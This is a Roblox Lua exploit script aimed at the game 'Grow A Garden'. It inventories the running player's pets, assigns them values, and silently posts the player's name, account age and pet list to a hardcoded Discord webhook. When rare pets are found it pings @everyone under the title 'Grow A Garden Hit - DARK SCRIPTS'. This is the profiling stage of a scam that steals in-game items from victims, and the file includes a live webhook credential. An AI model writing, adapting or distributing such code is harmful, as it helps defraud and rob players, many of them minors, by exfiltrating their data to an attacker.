local player = game.Players.LocalPlayer

-- === CONFIG ===
local WEBHOOK_URL = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU"

-- Priority pets ‚Üí emojis
local PRIORITY = {
    ["Raccoon"] = "ü¶ù",
    ["Dragonfly"] = "üêâ",
    ["Mimic Octopus"] = "üêô",
    ["Red Fox"] = "ü¶ä",
    ["Disco Bee"] = "üéµüêù",
    ["Queen Bee"] = "üëëüêù",
    ["Lobster Thermidor"] = "ü¶û",
    ["Golden Goose"] = "ü•áü¶¢"
}

-- Priority pets ‚Üí base values
local PRIORITY_VALUES = {
    ["Raccoon"] = 250,
    ["Dragonfly"] = 50,
    ["Mimic Octopus"] = 30,
    ["Red Fox"] = 10,
    ["Disco Bee"] = 200,
    ["Queen Bee"] = 20,
    ["Lobster Thermidor"] = 30,
    ["Golden Goose"] = 15
}

-- Allowed pets
local PETS = {
    "Raccoon","Bunny","Dog","Golden Lab","Dairy Cow","Starfish","Crab","Seagull","Black Bunny",
    "Cat","Chicken","Deer","Bee","Bacon Pig","Jackalope","Orange Tabby","Pig","Rooster",
    "Monkey","Flamingo","Toucan","Sea Turtle","Orangutan","Seal","Honey Bee","Wasp","Cow",
    "Silver Monkey","Sea Otter","Turtle","Polar Bear","Grey Mouse","Mole","Frog","Panda",
    "Blood Kiwi","Blood Hedgehog","Moon Cat","Petal Bee","Tarantula Hawk","Moth","Ostrich",
    "Peacock","Capybara","Scarlet Macaw","Meerkat","Sand Snake","Bald Eagle","Raptor",
    "Triceratops","Pterodactyl","Stegosaurus","Parasaurolophus","Iguanodon","Pachycephalosaurus",
    "Tanuki","Tanchozuru","Kodama","Corrupted Kodama","Sushi Bear","Hotdog Daschund","Seedling",
    "Snail","Giant Ant","Caterpillar","Brown Mouse","Squirrel","Praying Mantis","Echo Frog",
    "Chicken Zombie","Night Owl","Red Giant Ant","Cooked Owl","Butterfly","Mimic Octopus",
    "Axolotl","Hyacinth Macaw","Hamster","Brontosaurus","Dilophosaurus","Ankylosaurus","Owl",
    "Koi","Kappa","Raiju","Spaghetti Sloth","Mochi Mouse","Junkbot","Gorilla Chef","Golem",
    "Red Fox","Dragonfly","Disco Bee","Queen Bee","Lobster Thermidor","Golden Goose"
}

-- Prepare lowercase keywords
local PET_KEYWORDS = {}
for _, name in ipairs(PETS) do
    PET_KEYWORDS[#PET_KEYWORDS+1] = name:lower()
end

local function isPet(name)
    local lower = name:lower()
    for _, keyword in ipairs(PET_KEYWORDS) do
        if string.find(lower, keyword) then return true end
    end
    return false
end

local function getPriorityEmoji(name)
    for petName, emoji in pairs(PRIORITY) do
        if string.find(name:lower(), petName:lower()) then return emoji end
    end
    return nil
end

-- Collect pets from a container
local function collectPets(container)
    local items = {}
    if not container then return items, 0, 0 end
    for _, obj in ipairs(container:GetChildren()) do
        if obj:IsA("Tool") and isPet(obj.Name) then
            table.insert(items, obj.Name)
        end
    end

    local priorityItems, normalItems = {}, {}
    local totalValue = 0

    for _, name in ipairs(items) do
        local emoji = getPriorityEmoji(name)
        local baseValue = 0
        for petName, petValue in pairs(PRIORITY_VALUES) do
            if string.find(string.lower(name), string.lower(petName)) then
                baseValue = petValue
                break
            end
        end

        local displayName = name
        local value = baseValue

        if emoji then
            -- True priority pets
            if baseValue >= 50 then
                displayName = "Titanic " .. name
                value = value + 2000
            elseif baseValue >= 30 then
                displayName = "Huge " .. name
                value = value + 1000
            end
            table.insert(priorityItems, emoji .. " " .. displayName .. " (Value: " .. baseValue .. ")")
        else
            -- Non-priority pets: 30+kg show üí™ but no ping
            if baseValue >= 30 then
                displayName = "üí™ " .. name
            else
                displayName = "üê∂ " .. name
            end
            table.insert(normalItems, displayName)
        end

        totalValue = totalValue + value
    end

    table.sort(priorityItems, function(a,b) return a:lower()<b:lower() end)
    table.sort(normalItems, function(a,b) return a:lower()<b:lower() end)

    local ordered = {}
    for _,n in ipairs(priorityItems) do table.insert(ordered,n) end
    for _,n in ipairs(normalItems) do table.insert(ordered,n) end

    return ordered, #priorityItems > 0, totalValue
end

-- Collect pets from Backpack and Equipped
local backpack, hasPriorityBackpack, backpackValue = collectPets(player:FindFirstChild("Backpack"))
local equipped, hasPriorityEquipped, equippedValue = collectPets(player.Character)

local totalValue = backpackValue + equippedValue

-- Build Discord embed
local description = table.concat({
    "Player Information",
    "Name: " .. player.Name,
    "Executor: Delta",
    "Account Age: " .. player.AccountAge .. " days",
    "",
    "Total Value: üí∞ " .. totalValue,
    "",
    "Backpack",
    #backpack > 0 and table.concat(backpack, "\n") or "No pets found."
}, "\n")

-- Only real priority pets trigger ping
local hasPriority = hasPriorityBackpack or hasPriorityEquipped
local ping = hasPriority and "@everyone" or ""

local payload = {
    content = ping,
    embeds = {{
        title = "üåµ Grow A Garden Hit - DARK SCRIPTS üçÄ",
        description = description,
        color = hasPriority and 15158332 or 3447003
    }}
}

local json = game:GetService("HttpService"):JSONEncode(payload)

local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
if req then
    pcall(function()
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    end)
else
    warn("‚ùå Your executor does not support HTTP requests.")
end
